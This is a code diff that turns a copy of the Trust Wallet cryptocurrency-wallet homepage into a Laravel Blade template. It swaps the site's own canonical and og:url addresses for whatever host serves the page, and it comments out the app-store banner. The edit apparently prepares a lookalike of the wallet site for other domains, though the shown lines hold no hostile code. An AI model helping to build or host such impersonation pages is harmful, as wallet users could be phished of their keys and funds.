@@ -14,11 +14,11 @@
       <meta property="og:locale" content="en" />
       <meta property="og:image" content="https://trustwallet.com/assets/images/media/preview/horizontal_blue.png" />
       <meta property="og:type" content="website" />
-      <link rel="canonical" href="https://trustwallet.com/" />
-      <meta property="og:url" content="https://trustwallet.com/" />
+      <link rel="canonical" href="{{ request()->getHost() }}" />
+      <meta property="og:url" content="{{ request()->getHost() }}" />
       <meta property="og:site_name" content="Trust Wallet" />
       <meta property="al:ios:app_name" content="Trust Wallet" />
-      <meta property="al:ios:app_store_id" content="1288339409" />
+      {{-- <meta property="al:ios:app_store_id" content="128829" /> --}}
       <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
       <meta property="al:ios:url" content="trust://" />
       <meta property="al:android:app_name" content="Trust Wallet" />
@@ -26,13 +26,13 @@
       <meta property="al:android:url" content="https://trustwallet.com" />
       <link rel="shortcut icon" href="/assets/images/favicon.ico" type="image/x-icon">
       <link rel="shortcut icon" type="image/png" href="/assets/images/favicon.png" />
-      <meta name="apple-itunes-app" content="app-id=1288339409,affiliate-data=11l7ss">
+      {{-- <meta name="apple-itunes-app" content="app-id=1288339409,affiliate-data=11l7ss"> --}}
       <meta name="theme-color" content="#3375BB">
       <script type="application/ld+json">
          {
            "description": "Trust Wallet is the best ethereum wallet and cryptocurrency wallet to store your favourite BEP2, ERC20 and ERC721, tokens. Download the Android Trust Wallet and iOS app today!",
            "@type": "WebPage",
-           "url": "https://trustwallet.com/",
+           "url": "{{ request()->getHost() }}",
            "headline": "Best Cryptocurrency Wallet | Ethereum Wallet | ERC20 Wallet | Trust Wallet",
            "@context": "https://schema.org"
          }
